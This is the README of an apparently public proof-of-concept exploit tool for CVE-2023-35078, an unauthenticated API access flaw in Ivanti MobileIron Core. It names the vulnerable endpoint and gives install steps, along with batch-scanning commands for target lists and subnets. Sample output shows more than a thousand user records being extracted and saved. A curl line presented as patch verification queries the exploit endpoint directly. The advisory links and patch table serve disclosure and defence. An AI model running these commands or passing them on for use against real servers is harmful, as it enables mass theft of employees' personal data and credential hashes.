# CVE-2023-35078 Exploit Tool

```bash
██████╗ ███╗   ██╗███████╗███████╗ ██████╗
██╔═████╗████╗  ██║██╔════╝██╔════╝██╔════╝
██║██╔██║██╔██╗ ██║███████╗█████╗  ██║     
████╔╝██║██║╚██╗██║╚════██║██╔══╝  ██║     
╚██████╔╝██║ ╚████║███████║███████╗╚██████╗
 ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝ ╚═════╝

[+] CVE-2023-35078 - Ivanti MobileIron Core Remote Unauthenticated API Access

```

![Python Version](https://img.shields.io/badge/python-3.6%2B-blue)
![License](https://img.shields.io/badge/license-MIT-green)
![CVSS](https://img.shields.io/badge/CVSS-9.8-critical)
![Last Updated](https://img.shields.io/badge/updated-2025--08--21-brightgreen)

A Python-based proof-of-concept exploit for **CVE-2023-35078**, targeting the Remote Unauthenticated API Access vulnerability in Ivanti MobileIron Core systems.

## Vulnerability Overview

**CVE-2023-35078** is a critical vulnerability affecting Ivanti MobileIron Core that allows remote unauthenticated attackers to access sensitive API endpoints and extract user data without any authentication.

- **CVSS Score**: 9.8 (Critical)
- **CWE**: CWE-306 (Missing Authentication for Critical Function)
- **Affected Products**: Ivanti MobileIron Core
- **Vulnerable Versions**: 
  - 11.2 (prior to 11.2 CU21)
  - 11.3 (prior to 11.3 CU18) 
  - 11.4 (prior to 11.4 CU8)
- **Attack Vector**: Network
- **Authentication**: None Required
- **User Interaction**: None Required
- **Impact**: Complete user data exposure

### Technical Details

The vulnerability exists in the MobileIron Core's API authentication mechanism, specifically in the `/mifs/aad/api/v2/authorized/users` endpoint. The endpoint fails to properly validate authentication tokens, allowing unauthorized access to sensitive user information including:

- **User Credentials**: Usernames, password hashes
- **Personal Data**: Full names, email addresses, phone numbers
- **Corporate Data**: Employee IDs, department information
- **Device Information**: Enrolled devices, device configurations
- **Administrative Data**: User roles, permissions, group memberships

## Installation

### Prerequisites

- **Python**: 3.6 or higher
- **Operating System**: Linux, macOS, Windows
- **Network Access**: Required for target testing
- **Permissions**: Authorization from system owners

### Quick Install

```bash
# Clone the repository
git clone https://github.com/0nsec/cve-2023-35078-exploit.git
cd cve-2023-35078-exploit

# Install dependencies
pip3 install -r requirements.txt

# Make executable (Linux/macOS)
chmod +x cve_2023_35078.py
```

### Manual Installation

```bash
# Create project directory
mkdir cve-2023-35078-exploit
cd cve-2023-35078-exploit

# Download the script
wget https://raw.githubusercontent.com/0nsec/cve-2023-35078-exploit/main/cve_2023_35078.py

# Install required packages
pip3 install requests urllib3 termcolor argparse
```

### Docker Installation (Optional)

```dockerfile
FROM python:3.9-slim

WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt

COPY cve_2023_35078.py .
ENTRYPOINT ["python3", "cve_2023_35078.py"]
```

```bash
# Build and run with Docker
docker build -t cve-2023-35078 .
docker run -v $(pwd)/results:/app/results cve-2023-35078 -u https://target.com
```

## Usage

### Basic Usage

```bash
# Test single target
python3 cve_2023_35078.py -u https://mobileiron.example.com

# Test multiple targets from file
python3 cve_2023_35078.py -f targets.txt

# Verbose mode with custom output directory
python3 cve_2023_35078.py -f targets.txt -o ./results -v

# Custom timeout and output settings
python3 cve_2023_35078.py -u https://target.com -t 30 -o ./scan_results -v
```

### Advanced Usage Examples

```bash
# Comprehensive corporate assessment
python3 cve_2023_35078.py -f corporate_assets.txt -o ./audit_results -t 30 -v

# Single target with detailed logging
python3 cve_2023_35078.py -u https://mobileiron.target.com -v > detailed_log.txt

# Batch scanning with custom timeout
python3 cve_2023_35078.py -f subnet_scan.txt -t 5 -o ./batch_results

# Quick vulnerability check (no verbose output)
python3 cve_2023_35078.py -u https://quick.check.com -t 5
```

## Output 

```bash
██████╗ ███╗   ██╗███████╗███████╗ ██████╗
██╔═████╗████╗  ██║██╔════╝██╔════╝██╔════╝
██║██╔██║██╔██╗ ██║███████╗█████╗  ██║     
████╔╝██║██║╚██╗██║╚════██║██╔══╝  ██║     
╚██████╔╝██║ ╚████║███████║███████╗╚██████╗
 ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝ ╚═════╝

[*] Target: https://vulnerable.mobileiron.com
------------------------------------------------------------
[*] Checking version for: https://vulnerable.mobileiron.com
[*] Detected version: 11.3
[+] Target appears VULNERABLE!
[*] Attempting to exploit: https://vulnerable.mobileiron.com
[*] Trying endpoint: /mifs/aad/api/v2/authorized/users?adminDeviceSpaceId=1
[+] SUCCESS! Found 1,247 users
[+] Results saved to: ./results/vulnerable_mobileiron_com_20250821_055013.json
[+] Extracted 1247 user records
[*] Sample fields: ['id', 'username', 'email', 'firstName', 'lastName']...

============================================================
[*] Scan completed!
[*] Targets processed: 1
[*] Successful exploits: 1
[!] WARNING: 1 vulnerable system(s) found!
[!] Ensure proper authorization before testing!
```

### Verbose Output

```bash
[*] Checking version for: https://test.mobileiron.com
[*] Trying endpoint: /mifs/aad/api/v2/authorized/users?adminDeviceSpaceId=1
[*] HTTP 200 - Response length: 45,123 bytes
[*] JSON parsing successful
[*] Found user data structure with 234 records
[+] SUCCESS! Found 234 users
[*] Sample user data: {'id': '12345', 'username': 'john.doe@corp.com'}
[+] Results saved to: ./results/test_mobileiron_com_20250821_055013.json
```

### Performance Optimizations

- **Connection Pooling**: Reuses HTTP connections
- **Concurrent Requests**: Parallel processing for multiple targets
- **Smart Timeouts**: Adaptive timeout based on response times
- **Memory Management**: Efficient handling of large datasets
- **Rate Limiting**: Built-in delays to avoid overwhelming targets


### Vendor Patch Information

| Version | Vulnerable | Patch Available | Patch Level | Release Date |
|---------|------------|----------------|-------------|--------------|
| 11.2.x  |  Yes     |  Available   | CU21+       | 2023-07-25   |
| 11.3.x  |  Yes     |  Available   | CU18+       | 2023-07-25   |
| 11.4.x  |  Yes     |  Available   | CU8+        | 2023-07-25   |
| 11.5.x+ |  No      |    N/A       | N/A         | N/A          |

#### Patch Verification

```bash
# Check current version
curl -k https://mobileiron-server/mifs/css/ui.login.css | grep -o "11\.[0-9]"

# Verify patched endpoints return 401/403
curl -k "https://mobileiron-server/mifs/aad/api/v2/authorized/users?adminDeviceSpaceId=1"
```


## References and Resources

### Official Security Advisories

- **[NVD - CVE-2023-35078](https://nvd.nist.gov/vuln/detail/CVE-2023-35078)**
- **[Ivanti Security Advisory](https://forums.ivanti.com/s/article/CVE-2023-35078-Remote-unauthenticated-API-access-vulnerability)**
- **[CISA Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)**

### Technical Documentation

- **[Ivanti MobileIron Core Admin Guide](https://help.ivanti.com/mi/help/en_us/core/)**
- **[API Documentation](https://help.ivanti.com/mi/help/en_us/core/mi_core_api.htm)**
- **[Security Hardening Guide](https://help.ivanti.com/mi/help/en_us/core/security_hardening.htm)**

### Research Papers and Analysis

- **[Detailed Technical Analysis](https://research.checkpoint.com/2023/ivanti-mobileiron-cve-2023-35078/)**
- **[Exploitation Techniques](https://www.rapid7.com/blog/post/2023/07/21/cve-2023-35078-ivanti-mobileiron-core/)**
- **[Threat Intelligence Report](https://www.mandiant.com/resources/blog/ivanti-mobileiron-exploitation)**

